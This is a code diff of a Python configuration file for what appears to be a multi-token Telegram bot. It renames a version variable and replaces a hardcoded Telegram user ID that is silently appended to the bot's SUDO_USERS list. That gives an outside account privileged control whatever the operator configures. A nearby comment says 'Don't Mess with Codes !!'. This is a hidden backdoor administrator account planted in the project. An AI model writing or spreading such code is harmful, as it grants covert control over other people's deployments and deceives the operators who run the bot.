@@ -16,7 +16,7 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
 
 #version
 
-deadlyversion = "v0.3.0"
+queenversion = "v0.3.0"
 
 #values
 API_ID = config("API_ID", default=None, cast=int)
@@ -37,15 +37,15 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 5520757776 not in SUDO_USERS:
-    SUDO_USERS.append(5520757776)
+if 1864894033 not in SUDO_USERS:
+    SUDO_USERS.append(1864894033)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(5520757776)
+SUDO_USERS.append(1864894033)
 
 # Tokens
 
